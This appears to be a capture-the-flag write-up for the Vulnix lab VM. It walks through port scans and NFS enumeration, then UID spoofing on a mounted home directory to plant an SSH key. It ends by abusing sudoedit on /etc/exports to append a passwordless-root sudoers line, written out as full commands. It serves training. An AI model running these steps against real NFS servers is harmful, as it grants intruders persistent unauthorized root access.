@@ -1,0 +1,217 @@
+I"Ë=<p>This is GNU/Linux machine that contains a large number available ports, enumerate the NFS service allows us to identify the home directory to mount it on our machine, in order to add a public key and thus access the server, abuse the sudo permissions to edit the /etc/exports file allowed to get a shell with root privileges.</p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+
+<p>A ping scan detected the target machine, the script you can find it <a href="https://github.com/s4rgaz/hdiscovery.git">here</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnix<span class="nv">$ </span>hdiscovery.py <span class="nt">-t</span> 192.168.179.0/24
+192.168.179.174 is alive
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>A full TCP/UDP port scan with unicornscan discovered many ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnix<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> <span class="nt">-p1-65535</span> 192.168.179.174 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> <span class="nt">-p1-65535</span> 192.168.179.174 <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
+...
+listener statistics 386102 packets recieved 0 packets droped and 0 interface drops
+TCP open                     ssh[   22]         from 192.168.179.174  ttl 64 
+TCP open                    smtp[   25]         from 192.168.179.174  ttl 64 
+TCP open                  finger[   79]         from 192.168.179.174  ttl 64 
+TCP open                    pop3[  110]         from 192.168.179.174  ttl 64 
+TCP open                  sunrpc[  111]         from 192.168.179.174  ttl 64 
+TCP open                    imap[  143]         from 192.168.179.174  ttl 64 
+TCP open                    <span class="nb">exec</span><span class="o">[</span>  512]         from 192.168.179.174  ttl 64 
+TCP open                   login[  513]         from 192.168.179.174  ttl 64 
+TCP open                   shell[  514]         from 192.168.179.174  ttl 64 
+TCP open                   imaps[  993]         from 192.168.179.174  ttl 64 
+TCP open                   pop3s[  995]         from 192.168.179.174  ttl 64 
+TCP open                   shilp[ 2049]         from 192.168.179.174  ttl 64 
+TCP open                 unknown[33047]         from 192.168.179.174  ttl 64 
+TCP open                 unknown[33733]         from 192.168.179.174  ttl 64 
+TCP open                 unknown[45911]         from 192.168.179.174  ttl 64 
+TCP open                 unknown[48148]         from 192.168.179.174  ttl 64 
+TCP open                 unknown[55223]         from 192.168.179.174  ttl 64
+...
+listener statistics 12 packets recieved 0 packets droped and 0 interface drops
+UDP open                  sunrpc[  111]         from 192.168.179.174  ttl 64 
+UDP open                   shilp[ 2049]         from 192.168.179.174  ttl 64 
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+
+<p>An aggressive scan with nmap, that includes service and OS detection, script scanning and traceroute were performed in order to get more information about the target.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnix<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p22</span>,25,79,110,111,143,512,513,514,993,995,2049,33047,33733,45911,48148,55223 192.168.179.174 <span class="nt">-oN</span> nmap/service-enum.txt
+...
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf <span class="o">(</span>DSA<span class="o">)</span>
+|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a <span class="o">(</span>RSA<span class="o">)</span>
+|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f <span class="o">(</span>ECDSA<span class="o">)</span>
+25/tcp    open  smtp       Postfix smtpd
+|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
+|_ssl-date: 2021-12-05T08:32:18+00:00<span class="p">;</span> <span class="nt">-5h00m00s</span> from scanner time.
+79/tcp    open  finger     Linux fingerd
+|_finger: No one logged on.<span class="se">\x</span>0D
+110/tcp   open  pop3       Dovecot pop3d
+|_pop3-capabilities: TOP PIPELINING CAPA SASL RESP-CODES STLS UIDL
+|_ssl-date: 2021-12-05T08:32:14+00:00<span class="p">;</span> <span class="nt">-5h00m00s</span> from scanner time.
+111/tcp   open  rpcbind    2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
+| rpcinfo:
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  2,3,4       2049/tcp   nfs
+|   100003  2,3,4       2049/tcp6  nfs
+|   100003  2,3,4       2049/udp   nfs
+|   100003  2,3,4       2049/udp6  nfs
+|   100005  1,2,3      42464/udp6  mountd
+|   100005  1,2,3      46790/udp   mountd
+|   100005  1,2,3      48148/tcp   mountd
+|   100005  1,2,3      60796/tcp6  mountd
+|   100021  1,3,4      33047/tcp   nlockmgr
+|   100021  1,3,4      35625/tcp6  nlockmgr
+|   100021  1,3,4      50485/udp   nlockmgr
+|   100021  1,3,4      56578/udp6  nlockmgr
+|   100024  1          33733/tcp   status
+|   100024  1          40515/tcp6  status
+|   100024  1          44348/udp   status
+|   100024  1          46963/udp6  status
+|   100227  2,3         2049/tcp   nfs_acl
+|   100227  2,3         2049/tcp6  nfs_acl
+|   100227  2,3         2049/udp   nfs_acl
+|_  100227  2,3         2049/udp6  nfs_acl
+143/tcp   open  imap       Dovecot imapd
+|_imap-capabilities: LITERAL+ IMAP4rev1 ID have more SASL-IR listed post-login Pre-login LOGIN-REFERRALS capabilities ENABLE OK LOGINDISABLEDA0001 IDLE STARTTLS
+|_ssl-date: 2021-12-05T08:32:13+00:00<span class="p">;</span> <span class="nt">-5h00m00s</span> from scanner time.
+512/tcp   open  <span class="nb">exec       </span>netkit-rsh rexecd
+513/tcp   open  login
+514/tcp   open  shell      Netkit rshd
+993/tcp   open  ssl/imaps?
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2012-09-02T17:40:22
+| Not valid after:  2022-09-02T17:40:22
+| MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
+|_SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
+|_ssl-date: 2021-12-05T08:32:14+00:00<span class="p">;</span> <span class="nt">-5h00m00s</span> from scanner time.
+995/tcp   open  ssl/pop3s?
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
+| Issuer: <span class="nv">commonName</span><span class="o">=</span>vulnix/organizationName<span class="o">=</span>Dovecot mail server
+| Public Key <span class="nb">type</span>: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2012-09-02T17:40:22
+| Not valid after:  2022-09-02T17:40:22
+| MD5:   2b3f 3e28 c85d e10c 7b7a 2435 c5e7 84fc
+|_SHA-1: 4a49 a407 01f1 37c8 81a3 4519 981b 1eee 6856 348e
+|_ssl-date: 2021-12-05T08:32:14+00:00<span class="p">;</span> <span class="nt">-5h00m00s</span> from scanner time.
+2049/tcp  open  nfs_acl    2-3 <span class="o">(</span>RPC <span class="c">#100227)</span>
+33047/tcp open  nlockmgr   1-4 <span class="o">(</span>RPC <span class="c">#100021)</span>
+33733/tcp open  status     1 <span class="o">(</span>RPC <span class="c">#100024)</span>
+45911/tcp open  mountd     1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
+48148/tcp open  mountd     1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
+55223/tcp open  mountd     1-3 <span class="o">(</span>RPC <span class="c">#100005)</span>
+</code></pre></div></div>
+
+<h3 id="nfs-enumeration">NFS Enumeration</h3>
+
+<p>By listing the NFS service the vulnix home directory was discovered.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnix<span class="nv">$ </span>showmount <span class="nt">-e</span> 192.168.179.174
+Export list <span class="k">for </span>192.168.179.174:
+/home/vulnix <span class="k">*</span>
+</code></pre></div></div>
+
+<p>We mount this resource to the attacking machine.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnix<span class="nv">$ </span>mount <span class="nt">-t</span> nfs <span class="nt">-o</span> <span class="nv">vers</span><span class="o">=</span>2 192.168.179.174:/home/vulnix /mnt/nfs <span class="nt">-o</span> nolock
+
+root@kali:~/vulnix<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /mnt/nfs 
+<span class="nb">ls</span>: reading directory <span class="s1">'/mnt/nfs'</span>: Permission denied
+total 0
+</code></pre></div></div>
+
+<p>We donâ€™t have permissions to access this directory, so we create a new user.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnix<span class="nv">$ </span>useradd <span class="nt">-u</span> 2008 vulnix <span class="nt">-s</span> /bin/bash
+root@kali:~/vulnix<span class="nv">$ </span>su vulnix
+vulnix@kali:/root/vulnix<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span>
+vulnix@kali:/root/vulnix<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> /mnt/nfs/
+total 20
+drwxr-x--- 2 vulnix vulnix 4096 Sep  2  2012 <span class="nb">.</span>
+drwxr-xr-x 8 root   root   4096 Oct 12 07:05 ..
+<span class="nt">-rw-r--r--</span> 1 vulnix vulnix  220 Apr  3  2012 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 vulnix vulnix 3486 Apr  3  2012 .bashrc
+<span class="nt">-rw-r--r--</span> 1 vulnix vulnix  675 Apr  3  2012 .profile
+</code></pre></div></div>
+
+<p>Now we can access to the mounted directory, therefore we generate an SSH key pair.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnix<span class="nv">$ </span>ssh-keygen <span class="nt">-P</span> <span class="s2">"vuln1x"</span> <span class="nt">-f</span> rev
+</code></pre></div></div>
+
+<p>We create the directory.ssh and inside it we create the authorized_key file with the public key.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vulnix@kali:/root/vulnix<span class="nv">$ </span><span class="nb">mkdir</span> /mnt/nfs/.ssh
+vulnix@kali:/root/vulnix<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyUpW9I3kgSpB8/LFNUQjCn5WifIZn0HKKULEGRuN0LPUwXGbdKLEkDr4HYdWP7eJ2eaaSmT/FU0K2G/Y9hUoDFN+FF7B86lx0SQ6Fiw4YZYb2ci3fLBK7Y9aTccTyDkQHgw2MptO046RB7KTaI3FixjhVBlbFzWaMLuiuBLK0ro26MqceHWqM+u1rG0PJFnp/2as6d7EOyFM3164R0xlQjNZMMHbpS6q6NKeyqVisE7wEMureRtokCkiykW+IbpkNUDndI2DFWMGF6XnvJuy6vxPwAIHodAGChSm2skuvO4am+UGTwrQZ/N4ylfcDzsuDIhiUI1nwD53lPs+vnsyCire9VRWoOp32ME+SGQVElkxM48xKPumemeDpV5UOC9Un4t/zoIs+cOWHcTtSI2MRj/KnXXzs22yv7eQPyxnDKj4VT/ld/41xaItUpE+RYF9Xn+nWTmbTZbfW5sGwnSosvlR1Ur+xcikaRs5gD9ytCl5d9iBeBSVgfWhczPbZ/p0='</span> <span class="o">&gt;</span> /mnt/nfs/.ssh/authorized_keys
+</code></pre></div></div>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="access-via-ssh">Access via SSH</h3>
+
+<p>We login via SSH as user vulnix using the private key generated.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnix<span class="nv">$ </span>ssh <span class="nt">-l</span> vulnix 192.168.179.174 <span class="nt">-i</span> rev 
+Enter passphrase <span class="k">for </span>key <span class="s1">'rev'</span>: 
+vulnix@vulnix:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>2008<span class="o">(</span>vulnix<span class="o">)</span>
+</code></pre></div></div>
+
+<p>With sudo permissions we can edit the /etc/exports file and get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vulnix@vulnix:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching <span class="s1">'Defaults'</span> entries <span class="k">for </span>vulnix on this host:
+    env_reset, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+
+User vulnix may run the following commands on this host:
+    <span class="o">(</span>root<span class="o">)</span> sudoedit /etc/exports, <span class="o">(</span>root<span class="o">)</span> NOPASSWD: sudoedit /etc/exports
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="sudo-permissions">Sudo Permissions</h3>
+
+<p>The /etc/exports file indicates all directories that a server exports to its clients.</p>
+
+<p>We add the following configuration specifying the directory /etc to export, allowing the root user to access the NFS server as root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vulnix@vulnix:~<span class="nv">$ </span>sudoedit /etc/exports
+</code></pre></div></div>
+
+<p><img src="/assets/images/vulnix/screenshot-1.png" alt="" /></p>
+
+<p>Then we reboot the virtual machine for the changes to take effect, we mount the directory /etc and add to the sudoers file the user vulnix and thus be able to execute any command as sudo without password.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/vulnix<span class="nv">$ </span>mount <span class="nt">-t</span> nfs <span class="nt">-o</span> <span class="nv">vers</span><span class="o">=</span>2 192.168.179.174:/etc /mnt/nfs <span class="nt">-o</span> nolock
+
+root@kali:~/vulnix<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'vulnix ALL=(ALL) NOPASSWD:ALL'</span> <span class="o">&gt;&gt;</span> /mnt/nfs/sudoers
+</code></pre></div></div>
+
+<p>We execute the following command and get root.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vulnix@vulnix:~<span class="nv">$ </span><span class="nb">sudo </span>su -
+root@vulnix:~# <span class="nb">ls
+</span>trophy.txt
+root@vulnix:~# <span class="nb">cat </span>trophy.txt 
+cc614640424f5bd60ce5d5264899c3be
+</code></pre></div></div>
+:ET
